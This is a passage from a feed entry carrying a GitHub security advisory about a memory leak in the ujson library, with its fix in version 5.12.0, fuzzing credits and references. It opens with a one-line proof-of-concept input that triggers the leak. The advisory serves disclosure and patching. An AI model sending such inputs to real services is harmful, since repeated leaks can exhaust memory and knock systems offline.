ujson.loads(str(10 ** sys.get_int_max_str_digits()))  # Leaks and raises ValueError
</code></pre>
<h4 id="fix">Fix</h4>
<p>The leak is fixed in <code>ujson 5.12.0</code> (4baeb950df780092bd3c89fc702a868e99a3a1d2). There are no workarounds beyond upgrading to an unaffected version.</p>
<h4 id="credits">Credits</h4>
<p>Discovered by Cameron Criswell/Skevros using Coverage-guided fuzzing (libFuzzer + AddressSanitizer)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ultrajson/ultrajson/security/advisories/GHSA-wgvc-ghv9-3pmm">https://github.com/ultrajson/ultrajson/security/advisories/GHSA-wgvc-ghv9-3pmm</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/commit/4baeb950df780092bd3c89fc702a868e99a3a1d2">https://github.com/ultrajson/ultrajson/commit/4baeb950df780092bd3c89fc702a868e99a3a1d2</a></li>
<li><a href="https://github.com/ultrajson/ultrajson/releases/tag/5.12.0">https://github.com/ultrajson/ultrajson/releases/tag/5.12.0</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvc-ghv9-3pmm">https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvc-ghv9-3pmm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T13:01:15.000Z</published>
    </entry>
</feed>